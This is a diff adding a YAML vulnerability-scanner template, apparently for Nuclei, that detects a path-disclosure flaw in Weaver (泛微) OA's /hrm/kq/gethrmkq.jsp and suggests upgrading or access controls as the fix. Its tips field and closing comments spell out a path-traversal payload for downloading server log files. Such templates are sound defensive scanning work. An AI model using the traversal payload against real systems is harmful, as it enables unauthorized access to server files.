@@ -1,0 +1,40 @@
+id: weaver-gethrmkq_jsp-log-disclosure
+
+info:
+  name: 泛微 OA hrm/kq/gethrmkq.jsp log - disclosure
+  author: cnaq,leadlife  
+  severity: medium
+  description: 泛微OA /hrm/kq/gethrmkq.jsp 报错泄露物理路径，可下载日志文件
+  reference:
+    - https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEOA%20%E6%97%A5%E5%BF%97%E6%B3%84%E9%9C%B2/
+  metadata:
+    verified: true
+    fofa-qeury:
+    repiar: 联系开发商升级至新版或对路径进行访问控制
+    tips: |
+      读取物理路径 hrm/kq/gethrmkq.jsp?filename=1
+      日志下载 hrm/kq/gethrmkq.jsp?filename=1..\1..\1.txt
+  tags: weaver,oa,disclosure
+
+
+http:
+  - raw:
+      - |
+        GET /hrm/kq/gethrmkq.jsp?filename=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          
+      - type: word
+        part: body
+        words:
+          - '.java'
+          - 'ecology'
+        condition: and
+          
+# 读取物理路径 /hrm/kq/gethrmkq.jsp?filename=1
+# 日志下载 /hrm/kq/gethrmkq.jsp?filename=1..\1..\1.txt
